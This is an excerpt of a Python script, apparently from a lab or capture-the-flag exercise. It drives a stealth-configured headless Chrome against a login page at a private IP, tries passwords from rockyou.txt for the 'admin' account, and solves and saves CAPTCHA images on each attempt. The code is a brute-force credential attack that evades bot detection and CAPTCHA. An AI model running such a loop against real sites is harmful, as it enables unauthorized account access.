...
os.makedirs("captchas2", exist_ok=True)
...
stealth(chrome, languages=["en-US", "en"], vendor="Google Inc.", platform="Win32", webgl_vendor="Intel Inc.", renderer="Intel Iris OpenGL Engine", fix_hairline=True,)

# CONFIG
ip = 'http://10.82.135.178/'
login_url = f'{ip}/index.php'
dashboard_url = f'{ip}/dashboard.php'

username = "admin"

with open('/opt/rockyou.txt', 'r') as passwords:
    for i in range(100):
        ...
        while True:
            ...
            image.save(f"captchas2/captcha_{password}_{captcha_text}.png")

            print(f"[*] Trying password number {i} : {password} with CAPTCHA: {captcha_text}")
